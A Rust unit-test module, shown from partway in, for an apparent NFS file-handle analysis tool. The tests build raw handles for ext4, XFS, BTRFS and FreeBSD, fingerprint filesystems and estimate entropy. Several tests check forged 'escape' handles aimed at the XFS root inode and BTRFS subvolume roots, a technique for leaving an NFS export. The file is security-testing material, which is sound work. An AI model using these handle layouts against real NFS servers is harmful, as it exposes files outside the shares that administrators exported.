    /// Build a Linux BTRFS handle with fsid_type=2 (12-byte fsid).
    fn linux_btrfs_fsid2_handle(inode: u32, generation: u32) -> FileHandle {
        let mut data = vec![
            0x01, // version = 1
            0x00, // auth_type = 0
            0x02, // fsid_type = 2 (dev + UUID prefix, 12 bytes)
            0x4d, // fileid_type = 0x4d (BTRFS)
        ];
        // fsid: 12 bytes
        data.extend_from_slice(&[0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0xAA, 0xBB, 0xCC, 0xDD]);
        data.extend_from_slice(&inode.to_le_bytes());
        data.extend_from_slice(&generation.to_le_bytes());
        FileHandle::from_bytes(&data)
    }

    #[test]
    fn construct_handle_for_inode_fsid_type_1_works() {
        // ext4 with fsid_type=1 (4-byte compact fsid) -- tests the short fsid path.
        let mut data = vec![
            0x01, 0x00, 0x01, // fsid_type = 1 (4-byte dev number)
            0x01, // fileid_type = FILEID_INO32_GEN (ext4)
            0x08, 0x00, 0x00, 0x00, // fsid: 4 bytes
        ];
        data.extend_from_slice(&5u32.to_le_bytes()); // export inode
        data.extend_from_slice(&0u32.to_le_bytes()); // export gen
        let export_fh = FileHandle::from_bytes(&data);
        let result = FileHandleAnalyzer::construct_handle_for_inode(&export_fh, 42, 0);
        assert!(result.is_some(), "ext4 + fsid_type=1 must produce a handle");
        let r = result.unwrap();
        // inode offset for fsid_type=1: 4 + 4 (fsid) = 8
        let raw = r.root_handle.as_bytes();
        let inode = u32::from_le_bytes([raw[8], raw[9], raw[10], raw[11]]);
        assert_eq!(inode, 42);
    }

    #[test]
    fn construct_handle_for_inode_fsid_type_2_works() {
        // ext4 with fsid_type=2 (12-byte fsid) -- tests the medium-length fsid path.
        let mut data = vec![
            0x01, 0x00, 0x02, // fsid_type = 2 (dev + UUID prefix, 12 bytes)
            0x01, // fileid_type = FILEID_INO32_GEN (ext4)
        ];
        data.extend_from_slice(&[0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0xAA, 0xBB, 0xCC, 0xDD]); // 12-byte fsid
        data.extend_from_slice(&7u32.to_le_bytes()); // export inode
        data.extend_from_slice(&0u32.to_le_bytes()); // export gen
        let export_fh = FileHandle::from_bytes(&data);
        let result = FileHandleAnalyzer::construct_handle_for_inode(&export_fh, 99, 7);
        assert!(result.is_some(), "ext4 + fsid_type=2 must produce a handle");
        let r = result.unwrap();
        // inode offset for fsid_type=2: 4 + 12 = 16
        let raw = r.root_handle.as_bytes();
        let inode = u32::from_le_bytes([raw[16], raw[17], raw[18], raw[19]]);
        assert_eq!(inode, 99);
    }

    #[test]
    fn construct_escape_handle_xfs_returns_inode_128() {
        // XFS handle: fsid_type=6 (16-byte UUID), fileid_type=0x81 (FILEID_INO64_GEN).
        // Real XFS with UUID-based exports always uses 0x81 to signal 64-bit inodes.
        let mut data = vec![
            0x01, // version = 1
            0x00, // auth_type = 0
            0x06, // fsid_type = 6  --  UUID-based (XFS)
            0x81, // fileid_type = FILEID_INO64_GEN -- XFS 64-bit inode marker
        ];
        // fsid: 16 bytes
        data.extend_from_slice(&[0xAA; 16]);
        // fileid: 64-bit inode + 32-bit generation
        data.extend_from_slice(&500u64.to_le_bytes());
        data.extend_from_slice(&1u32.to_le_bytes());
        let fh = FileHandle::from_bytes(&data);
        let result = FileHandleAnalyzer::construct_escape_handle(&fh);
        assert!(result.is_some(), "XFS escape must succeed");
        let r = result.unwrap();
        assert_eq!(r.fs_type, FsType::Xfs);
        // Root inode on XFS v5 is 128; stored as 64-bit LE at inode offset 4+16=20
        let raw = r.root_handle.as_bytes();
        let inode = u64::from_le_bytes([raw[20], raw[21], raw[22], raw[23], raw[24], raw[25], raw[26], raw[27]]);
        assert_eq!(inode, 128, "XFS escape must target root inode 128");
    }

    #[test]
    fn fingerprint_fs_xfs_from_fsid_type_6() {
        let mut data = vec![
            0x01, 0x00, 0x06, // fsid_type = 6  --  UUID
            0x02, // fileid_type = 2
        ];
        data.extend_from_slice(&[0x01; 16]); // 16-byte fsid
        data.extend_from_slice(&128u32.to_le_bytes()); // inode = 128 (XFS root)
        data.extend_from_slice(&0u32.to_le_bytes());
        let fh = FileHandle::from_bytes(&data);
        assert_eq!(FileHandleAnalyzer::fingerprint_fs(&fh), FsType::Xfs);
    }

    #[test]
    fn fingerprint_fs_xfs_from_fsid_type_7() {
        // XFS with fsid_type=7 and fileid_type=0x81 (FILEID_INO64_GEN).
        // 0x81 is the definitive XFS marker regardless of fsid_type.
        let mut data = vec![
            0x01, 0x00, 0x07, // fsid_type = 7
            0x81, // fileid_type = FILEID_INO64_GEN -- XFS
        ];
        data.extend_from_slice(&[0x01; 16]); // 16-byte UUID fsid
        data.extend_from_slice(&128u64.to_le_bytes()); // 64-bit inode
        data.extend_from_slice(&0u32.to_le_bytes());
        let fh = FileHandle::from_bytes(&data);
        assert_eq!(FileHandleAnalyzer::fingerprint_fs(&fh), FsType::Xfs);
    }

    /// XFS with device-based exports (fsid_type=0) uses FILEID_INO64_GEN (0x81)
    /// when the filesystem has 64-bit inodes.  This is the distinguishing marker
    /// between XFS and ext4 on fsid_type=0 handles.
    #[test]
    fn fingerprint_fs_xfs_fileid_type_0x81() {
        let mut data = vec![
            0x01, 0x00, 0x00, // fsid_type = 0 (device-based -- same as ext4)
            0x81, // fileid_type = FILEID_INO64_GEN -- XFS only
            // fsid: 8 bytes (device major:minor)
            0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,
        ];
        // inode (64-bit on XFS) + generation
        data.extend_from_slice(&128u64.to_le_bytes());
        data.extend_from_slice(&0u32.to_le_bytes());
        let fh = FileHandle::from_bytes(&data);
        assert_eq!(FileHandleAnalyzer::fingerprint_fs(&fh), FsType::Xfs, "fileid_type=0x81 must identify XFS even when fsid_type=0");
    }

    #[test]
    fn fingerprint_fs_unknown_fsid_type_returns_unknown() {
        let data = vec![
            0x01, 0x00, 0xFF, // fsid_type = 0xFF  --  unknown
            0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        ];
        let fh = FileHandle::from_bytes(&data);
        assert_eq!(FileHandleAnalyzer::fingerprint_fs(&fh), FsType::Unknown);
    }

    #[test]
    fn estimate_entropy_freebsd_handle_is_64_bits() {
        // Build a FreeBSD-style handle: 20+ bytes, bytes 8-9 = fid_len = 12
        let mut data = vec![0u8; 24];
        data[8] = 0x00;
        data[9] = 12; // fid_len = 12 in BE
        let fh = FileHandle::from_bytes(&data);
        assert_eq!(FileHandleAnalyzer::fingerprint_os(&fh), OsGuess::FreeBsd);
        let analysis = FileHandleAnalyzer::estimate_entropy(&fh);
        assert!((analysis.entropy_bits - 64.0).abs() < 1.0, "FreeBSD handle should have ~64 bits entropy, got {}", analysis.entropy_bits);
    }

    #[test]
    fn construct_btrfs_subvol_handles_start_at_fs_tree() {
        let data = vec![
            0x01, 0x00, 0x00, 0x4d, // BTRFS, fsid_type=0
            0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        ];
        let fh = FileHandle::from_bytes(&data);
        // max_subvols=3: returns 1 (FS tree) + 3 (user subvols) = 4 handles.
        let handles = FileHandleAnalyzer::construct_btrfs_subvol_handles(&fh, 3);
        assert_eq!(handles.len(), 4, "must produce 1 FS-tree handle + max_subvols user handles");
        // First handle targets the FS tree (root_objectid = BTRFS_FS_TREE_OBJECTID = 5).
        // Handle layout for fsid_type=0: 4B header + 8B fsid + 8B objectid + 8B root_objectid + 4B gen
        //   root_objectid offset = 4 + 8 + 8 = 20
        let raw = handles[0].root_handle.as_bytes();
        let root_objectid = u64::from_le_bytes([raw[20], raw[21], raw[22], raw[23], raw[24], raw[25], raw[26], raw[27]]);
        assert_eq!(root_objectid, 5, "first BTRFS handle must target FS_TREE_OBJECTID (5)");
        // Second handle is the first user subvolume (root_objectid = 256).
        let raw2 = handles[1].root_handle.as_bytes();
        let root_objectid2 = u64::from_le_bytes([raw2[20], raw2[21], raw2[22], raw2[23], raw2[24], raw2[25], raw2[26], raw2[27]]);
        assert_eq!(root_objectid2, 256, "second BTRFS handle must target first user subvolume (256)");
    }
}
